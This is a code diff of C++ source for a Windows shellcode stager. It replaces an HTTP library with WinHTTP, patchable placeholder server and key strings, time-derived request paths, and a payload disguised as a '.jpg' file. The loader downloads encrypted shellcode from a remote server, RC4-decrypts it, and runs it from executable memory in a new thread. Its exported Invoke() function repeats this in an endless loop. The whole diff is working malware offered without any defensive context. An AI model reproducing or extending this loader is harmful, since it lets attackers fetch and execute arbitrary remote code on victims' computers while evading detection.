@@ -1,4 +1,4 @@
-#pragma once
+//#pragma once
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -8,51 +8,209 @@
 #include <windows.h>  
 #include <string>
 #include "b64/base64.h"
-#include "Md5/md5.h"
+
 #include <iostream>
 #include <time.h>
 #include "rc4/ARC4.h"
-#include "http/httplib.h"
+#include "http/EdUrlParser.h"
+//#define  CPPHTTPLIB_OPENSSL_SUPPORT
+
+//#include "http/httplib.h"
+
+#include "Md5/md5.h"
+
+#include<winhttp.h>
+#pragma comment(lib,"Winhttp.lib")
+#pragma comment(lib,"ws2_32.lib")
+
 
 //#include<direct.h>
 //data段可读写  
-#pragma comment(linker, "/section:.data,RWE")   
+//#pragma comment(linker, "/section:.data,WE")   
 //不显示窗口  
-//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
+//#pragma comment(linker,"/subsystem:\"console\" /entry:\"mainCRTStartup\"") 
+
 //#pragma comment(linker, "/INCREMENTAL:NO")
 typedef PVOID(*M) (DWORD, DWORD, DWORD, DWORD);
 
 
-char target[MAX_PATH] = "";
+char target[MAX_PATH] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+						"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+						"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+						"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+						"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 
-httplib::Client cli(target);
-#ifndef _WIN64
-httplib::Headers headers = {
-{ "Accept-platform", "x86" }
-};
-#else
-httplib::Headers headers = {
-{ "Accept-platform", "x64" }
-};
-#endif
-const char obscure[] = "asdasjasdnlkasdj[psgdakn[jF*(";
-typedef void(__stdcall *CODE) ();
+
+
+
+
+
+
+
+const char obscure[] = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
+
+typedef DWORD(WINAPI *CODE) (LPVOID lpParamter);
 char * shellcode = NULL;
 int shellcode_size = 0; 
+
+std::string Request(std::string target, std::string path) {
+	DWORD dwSize = 0;
+	DWORD dwDownloaded = 0;
+	LPSTR pszOutBuffer;
+	BOOL  bResults = FALSE;
+	BOOL  useSSL = FALSE;
+	INTERNET_PORT port;
+	HINTERNET  hSession = NULL,
+		hConnect = NULL,
+		hRequest = NULL;
+	std::string reqResult;
+	
+	EdUrlParser* url = EdUrlParser::parseUrl(target);
+	
+	std::string p = url->port;
+	if (p.length() > 1) {
+		
+		//std::cout <<p <<"   "<<p.substr(2) << std::endl;
+		port = std::atoi(p.c_str());
+		
+	}
+	if (url->scheme == "https") {
+		useSSL = TRUE;
+		if (url->port == "") {
+			port = 443;
+		}
+	}
+	else {
+		if (url->port == "")
+			port = 80;
+	}
+
+
+
+
+	std::wstring h = std::wstring(url->hostName.begin(), url->hostName.end());
+	std::string strBasePath = url->path;
+	char last = strBasePath.back();
+	if (strcmp(&last,"/")) {
+		strBasePath += "/";
+	}
+	strBasePath += path;
+	std::cout << "request path:" << strBasePath <<"    port:"<< port<<std::endl;
+	std::wstring basePath = std::wstring(strBasePath.begin(), strBasePath.end());
+	wchar_t* host = (wchar_t*)h.c_str();
+
+	wchar_t* object = (wchar_t*)basePath.c_str();
+
+
+	// Use WinHttpOpen to obtain a session handle.
+	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
+		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+		WINHTTP_NO_PROXY_NAME,
+		WINHTTP_NO_PROXY_BYPASS, 0);
+
+	// Specify an HTTP server.
+	if (hSession)
+		hConnect = WinHttpConnect(hSession, host,
+			port, 0);
+
+	// Create an HTTP request handle.
+	if (hConnect)
+
+		hRequest = WinHttpOpenRequest(hConnect, L"GET", object,
+			NULL, WINHTTP_NO_REFERER,
+			WINHTTP_DEFAULT_ACCEPT_TYPES,
+			useSSL ? WINHTTP_FLAG_SECURE : 0);
+
+
+
+
+
+#ifndef _WIN64
+	LPCWSTR header = L"Accept-platform: x86\n";
+	SIZE_T len = lstrlenW(header);
+	WinHttpAddRequestHeaders(hRequest, header, len, WINHTTP_ADDREQ_FLAG_ADD);
+#else
+	LPCWSTR header = L"Accept-platform: x64\n";
+	SIZE_T len = lstrlenW(header);
+	WinHttpAddRequestHeaders(hRequest, header, len, WINHTTP_ADDREQ_FLAG_ADD);
+#endif
+
+
+	// Send a request.
+	if (hRequest)
+		bResults = WinHttpSendRequest(hRequest,
+			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+			WINHTTP_NO_REQUEST_DATA, 0,
+			0, 0);
+
+
+	// End the request.
+	if (bResults)
+		bResults = WinHttpReceiveResponse(hRequest, NULL);
+
+	// Keep checking for data until there is nothing left.
+	if (bResults)
+	{
+		do
+		{
+			// Check for available data.
+			dwSize = 0;
+			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
+				return "";
+
+
+			// Allocate space for the buffer.
+			pszOutBuffer = new char[dwSize + 1];
+			if (!pszOutBuffer)
+			{
+				return "";
+				dwSize = 0;
+			}
+			else
+			{
+				// Read the data.
+				ZeroMemory(pszOutBuffer, dwSize + 1);
+
+				if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
+					dwSize, &dwDownloaded))
+					return "";
+				else
+					reqResult += pszOutBuffer;
+
+				// Free the memory allocated to the buffer.
+				delete[] pszOutBuffer;
+			}
+		} while (dwSize > 0);
+	}
+
+
+	// Report any errors.
+	if (!bResults)
+		return "";
+
+	// Close any open handles.
+	if (hRequest) WinHttpCloseHandle(hRequest);
+	if (hConnect) WinHttpCloseHandle(hConnect);
+	if (hSession) WinHttpCloseHandle(hSession);
+	std::cout << "response:" << reqResult << std::endl;
+	return reqResult;
+}
+
+
 
 std::string GenerateUri()
 {
 	time_t myt = time(NULL);
 	int key = int(int(myt) / 100);
 	std::string u = string(obscure) + std::to_string(key);
-	return "/" + MD5(u).toStr();
+	return MD5_(u).toStr();
 }
 bool GetShellCodeSize()
 {
 	
-	auto res = cli.Get("/my/get_size",headers);
-	if (res->status != 200)return false;
-	shellcode_size = std::atoi(res->body.c_str());
+	string res = Request(target,"my/get_size");
+	if (res=="")return false;
+	shellcode_size = std::atoi(res.c_str());
 	shellcode = (char*)malloc(shellcode_size);
 	if (shellcode != 0) {
 		return true;
@@ -69,9 +227,8 @@ std::string GetKey()
 	}
 	
 	
-	auto res = cli.Get(GenerateUri().c_str(),headers);
-	if (res->status != 200)return "";
-	return res->body;	
+	string res = Request(target,GenerateUri());
+	return res;
 }
 void LoadShellCode(char *shellcode)
 {
@@ -82,10 +239,15 @@ void LoadShellCode(char *shellcode)
 	void* p = NULL;
 	p = VirtualAlloc_(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	memcpy_s(p, shellcode_size, shellcode, shellcode_size);
-
-	CODE code = (CODE)p;
-	code();
 	
+	CODE code = (CODE)p;
+	//code();
+	HANDLE hThread = CreateThread(NULL, 0, code, NULL, 0, NULL);
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);
+
+
+
 	
 	
 }
@@ -97,11 +259,11 @@ void DecPayload()
 	if (key == "")return;
 	time_t myt = time(NULL);
 	int filename = int(int(myt) / 100);
-	std::string url = "/" + std::to_string(filename) + ".jpg";
+	std::string url = std::to_string(filename) + ".jpg";
 	
-	auto res = cli.Get(url.c_str(),headers);
-	if (res->status != 200)return;
-	std::string body = res->body;
+	string res = Request(target,url);
+	if (res=="")return;
+	std::string body = res;
 	
 	std::string payload = base64_decode(body);
 	char * c_payload = (char *)malloc(shellcode_size);
@@ -112,7 +274,7 @@ void DecPayload()
 	}
 	rc4.setKey((unsigned char*)key.c_str(), key.length());
 	rc4.encrypt(c_payload, shellcode, shellcode_size);
-
+	
 	LoadShellCode(shellcode);
 }
 
@@ -121,11 +283,12 @@ extern "C" _declspec(dllexport) void Invoke();
 void Invoke()
 {
 	
-	Sleep(2000);
+	Sleep(3000);
 	while (true) {
 		try {
-			Sleep(2000);
+			
 			DecPayload();
+			Sleep(20000);
 		}
 		catch (const std::exception& e)
 		{
@@ -137,9 +300,10 @@ void Invoke()
 
 }
 
+
+
 int main()
 {  
-
 	Invoke();
 	return 0;
 	
